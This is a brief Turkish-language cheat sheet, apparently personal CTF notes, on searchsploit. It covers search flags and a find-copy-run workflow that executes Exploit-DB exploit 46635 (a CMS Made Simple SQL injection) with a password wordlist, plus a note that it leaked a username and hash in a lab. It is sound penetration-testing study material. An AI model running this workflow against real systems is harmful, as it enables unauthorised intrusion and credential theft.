# Searchsploit Cheatsheet

Exploit-DB'nin offline arama aracı. CMS/servis tespit edince ilk başvuru.

## Temel Kullanım

```bash
# Basit arama
searchsploit <yazılım adı>

# Örnek
searchsploit cms made simple
searchsploit apache 2.4
searchsploit vsftpd
```

## Faydalı Flagler

| Flag | Ne yapar? |
|---|---|
| `-w` | Exploit-DB web linkini göster |
| `-m <id>` | Exploit dosyasını çalışma dizinine kopyala |
| `-x <path>` | Exploit kodunu oku/incele |
| `--exact` | Tam eşleşme (daha az sonuç, daha isabetli) |
| `-t` | Sadece başlıkta ara |

## İş Akışı

```bash
# 1. Yazılımı ara
searchsploit cms made simple

# 2. İlgili exploit'i kopyala
searchsploit -m 46635

# 3. Exploit'i incele (ne yapıyor, nasıl çalıştırılır)
cat 46635.py

# 4. Çalıştır
python3 46635.py --url http://<ip>/simple --crack -w /usr/share/wordlists/rockyou.txt
```

## İpuçları

- Çok fazla sonuç gelirse versiyonu ekle: `searchsploit apache 2.4.49`
- "Unauthenticated" olanları tercih et (giriş gerektirmeyen)
- Remote > Local (uzaktan sömürülebilen daha değerli)
- Exploit çalışmıyorsa: Python 2/3 farkı, eksik kütüphane, veya hedef versiyonu kontrol et

## Gerçek Kullanımım

```
# Simple CTF:
searchsploit cms made simple
# → CVE-2019-9053 (SQLi, unauthenticated) buldum
searchsploit -m 46635
python3 46635.py ... → username + hash sızdı
```
